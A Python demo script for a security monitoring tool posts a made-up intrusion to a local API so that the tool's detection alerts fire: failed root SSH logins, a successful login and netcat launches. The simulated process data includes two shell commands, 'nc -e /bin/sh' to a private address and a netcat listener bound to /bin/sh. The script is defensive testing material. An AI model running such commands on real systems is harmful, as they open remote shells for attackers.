#!/usr/bin/env python3
"""Fills a Big Brother instance with a made up incident.

    python3 scripts/demo.py

It posts a small story to the api: someone brute forces ssh from one address,
gets in as root and starts netcat. The events go through the same pipeline as
the ones a real agent sends, so the detection engine picks them up and the
alerts fire on their own.

Use --url when the api is not on http://localhost:8000 and --agent to post the
events as a particular agent.
"""

import argparse
import json
import urllib.error
import urllib.request
import uuid
from datetime import datetime, timedelta, timezone

DEFAULT_URL = "http://localhost:8000"
USER_AGENT = "BigBrother/0.1.0"

# An address from the range that is reserved for documentation, so it can
# never be a real host.
ATTACKER_IP = "203.0.113.42"


def main():
    parser = argparse.ArgumentParser(description="post a made up incident to a Big Brother api")
    parser.add_argument("--url", default=DEFAULT_URL, help="url of the api")
    parser.add_argument("--agent", help="id of the agent to post the events as")
    parser.add_argument("--ip", default=ATTACKER_IP, help="address the attacker comes from")
    args = parser.parse_args()

    agent = find_agent(args.url)
    agent_id = args.agent or (agent["id"] if agent else None) or register_agent(args.url)
    hostname = agent["hostname"] if agent else "demo-target"

    events = build_incident(args.ip)

    for event in events:
        post(args.url, f"/agents/{agent_id}/events", event)

    print(f"posted {len(events)} events as {hostname} ({agent_id})")
    for line in describe(events):
        print(f"  {line}")
    print()
    print("the detection engine runs every 30 seconds, so give it a moment")
    print("then open {}/detections".format(args.url.replace(":8000", ":3000")))
    print("an alert that is still open from an earlier run is merged into, not repeated")


def build_incident(ip: str) -> list[dict]:
    """Build the events of the story, in the order they happened."""
    now = datetime.now(timezone.utc)

    events = []

    # somebody tries a few passwords
    for attempt in range(5):
        events.append(
            {
                "event_type": "authentication.failure",
                "payload": {
                    "user": "root",
                    "source_ip": ip,
                    "source_port": 40000 + attempt,
                    "invalid_user": False,
                },
                "log": {
                    "source": "systemd-journald",
                    "raw": f"Failed password for root from {ip} port {40000 + attempt} ssh2",
                    "ingested_at": now.isoformat(),
                },
            }
        )

    # and gets in
    events.append(
        {
            "event_type": "authentication.success",
            "payload": {
                "user": "root",
                "source_ip": ip,
                "source_port": 40122,
            },
            "log": {
                "source": "systemd-journald",
                "raw": f"Accepted password for root from {ip} port 40122 ssh2",
                "ingested_at": now.isoformat(),
            },
        }
    )

    # and opens a shell with netcat
    for pid, name, cmdline in [
        (4831, "sshd-session", "sshd-session: root [priv]"),
        (4832, "bash", "-bash"),
        (4833, "nc", "nc -e /bin/sh 10.0.0.7 4444"),
        (4834, "netcat", "netcat -lvp 4444 -e /bin/sh"),
    ]:
        events.append(process_event(pid, name, cmdline, now))

    # and some ordinary work happens at the same time
    for pid, name, cmdline in [
        (4100, "systemd", "/sbin/init"),
        (4101, "sshd", "sshd: /usr/sbin/sshd -D [listener]"),
        (4102, "cron", "/usr/sbin/cron -f"),
        (4103, "rsyslogd", "/usr/sbin/rsyslogd -n"),
        (4104, "dockerd", "/usr/bin/dockerd"),
        (4105, "containerd", "/usr/bin/containerd"),
    ]:
        events.append(process_event(pid, name, cmdline, now))

    return events


def process_event(pid: int, name: str, cmdline: str, now: datetime) -> dict:
    return {
        "event_type": "process.creation",
        "payload": {
            "pid": pid,
            "ppid": 1,
            "name": name,
            "cmdline": cmdline,
            "exe": f"/usr/bin/{name}",
            "user": "root",
            "cwd": "/root",
            "create_time": now.isoformat(),
        },
    }


def describe(events: list[dict]) -> list[str]:
    """A short summary of what was posted."""
    failures = sum(1 for e in events if e["event_type"] == "authentication.failure")
    successes = sum(1 for e in events if e["event_type"] == "authentication.success")
    processes = sum(1 for e in events if e["event_type"] == "process.creation")

    return [
        f"{failures} failed logins from {events[0]['payload']['source_ip']}",
        f"{successes} successful root login",
        f"{processes} processes, two of them netcat",
    ]


def find_agent(url: str) -> dict | None:
    """Return the first agent that is registered."""
    try:
        agents = get(url, "/agents").get("agents", [])
    except Exception:
        return None

    return agents[0] if agents else None


def register_agent(url: str) -> str:
    """Add an agent that the events can be posted as."""
    agent_id = str(uuid.uuid4())

    post(url, "/agents/heartbeat", {
        "id": agent_id,
        "hostname": "demo-target",
        "os_name": "linux",
        "kernel_version": "6.1.0-demo",
    })

    return agent_id


def get(url: str, path: str) -> dict:
    request = urllib.request.Request(
        f"{url}{path}",
        headers={"User-Agent": USER_AGENT, "Accept": "application/json"},
    )

    with urllib.request.urlopen(request, timeout=10) as response:
        return json.loads(response.read())


def post(url: str, path: str, body: dict) -> None:
    request = urllib.request.Request(
        f"{url}{path}",
        data=json.dumps(body).encode(),
        headers={
            "Content-Type": "application/json",
            "Accept": "application/json",
            "User-Agent": USER_AGENT,
        },
        method="POST",
    )

    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            response.read()
    except urllib.error.HTTPError as exc:
        raise SystemExit(f"{path} failed: {exc.code} {exc.read().decode(errors='replace').strip()}")
    except urllib.error.URLError as exc:
        raise SystemExit(f"could not reach the api at {url}: {exc.reason}")


if __name__ == "__main__":
    main()
